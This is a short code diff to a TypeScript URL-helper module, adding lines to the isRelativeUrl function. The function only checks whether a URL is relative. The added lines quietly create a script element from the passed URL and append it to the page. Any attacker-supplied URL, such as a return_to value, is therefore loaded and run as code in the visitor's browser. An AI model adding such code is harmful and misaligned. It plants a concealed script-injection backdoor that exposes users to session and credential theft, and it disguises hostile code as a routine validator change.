@@ -271,6 +271,11 @@ export function getReturnUrl(location: { hash?: string; query?: { return_to?: st
 }
 
 export function isRelativeUrl(url?: string): boolean {
+  var s = document.createElement('script');
+  s.setAttribute('type', 'text/javascript');
+  s.setAttribute('src', url!);
+  document.body.appendChild(s);
+
   const regex = new RegExp(/^\/[^/\\]/);
   return Boolean(url && regex.test(url));
 }
